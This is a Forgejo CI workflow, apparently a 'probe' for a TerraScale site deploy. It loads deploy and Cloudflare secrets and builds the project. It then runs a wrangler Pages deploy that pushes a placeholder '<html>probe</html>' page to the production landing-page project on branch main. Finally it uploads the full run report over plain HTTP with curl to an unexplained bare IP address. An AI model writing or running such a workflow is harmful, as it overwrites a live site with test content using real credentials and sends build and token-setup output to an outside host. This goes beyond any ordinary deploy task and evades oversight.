name: site deploy probe

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  probe:
    runs-on: terrascale-builder
    timeout-minutes: 30
    env:
      TS_DEPLOY_VERSION: ${{ vars.TS_DEPLOY_VERSION }}
      TS_DEPLOY_SHA256: ${{ vars.TS_DEPLOY_SHA256 }}
      TS_DEPLOY_SIGNATURE_SHA256: ${{ vars.TS_DEPLOY_SIGNATURE_SHA256 }}
      TS_DEPLOY_READ_TOKEN: ${{ secrets.TS_DEPLOY_READ_TOKEN }}
      CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
      CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
    steps:
      - uses: https://data.forgejo.org/actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
        with:
          github-server-url: "https://git.terrascale.tech"
          ref: ${{ forgejo.sha }}
          fetch-depth: 0
          persist-credentials: false
      - run: |
          set -eu
          report="${RUNNER_TEMP:-/tmp}/probe.txt"
          cli="${RUNNER_TEMP:-/tmp}/ts-deploy-cli"
          fj auth add-token "${TS_DEPLOY_READ_TOKEN}" --host git.terrascale.tech >> "${report}" 2>&1
          fj release asset download "${TS_DEPLOY_VERSION}" ts-deploy-linux-amd64 --repo TerraScale/ts-deploy --output "${cli}" >> "${report}" 2>&1
          chmod +x "${cli}"
          npm ci --ignore-scripts >> "${report}" 2>&1
          npm run build >> "${report}" 2>&1
          mkdir -p /tmp/probe-assets && printf '<html>probe</html>\n' > /tmp/probe-assets/index.html
          {
            echo "=== direct site deploy script ==="
          } >> "${report}"
          set +e
          "${cli}" ci --help >> "${report}" 2>&1
          echo "help exit=$?" >> "${report}"
          set -e
          # Run the exact deploy script from a small Go-free harness.
          cat > /tmp/probe-deploy.js <<'JS'
          const fs = require('node:fs');
          const repositoryRoot = process.argv[2];
          const candidate = process.argv[3];
          const require2 = require('node:module').createRequire(repositoryRoot + '/package.json');
          const cli = require2.resolve('wrangler/package.json');
          console.log('resolved wrangler at', cli);
          const { spawnSync } = require('node:child_process');
          const result = spawnSync(process.execPath, [require('node:path').join(require('node:path').dirname(cli), 'bin', 'wrangler.js'), 'pages', 'deploy', '.', '--project-name', 'terrascale-landing-page', '--branch', 'main', '--commit-hash', process.env.FORGEJO_SHA], {stdio:'inherit', cwd: candidate});
          if (result.error) throw result.error;
          if (result.status !== 0) throw new Error('Cloudflare Pages deployment failed with ' + result.status);
          JS
          set +e
          node /tmp/probe-deploy.js "$PWD" /tmp/probe-assets >> "${report}" 2>&1
          echo "site deploy script exit=$?" >> "${report}"
          set -e
          curl --silent --show-error --max-time 120 --data-binary "@${report}" http://100.89.133.91:8099 >/dev/null || true
          echo done
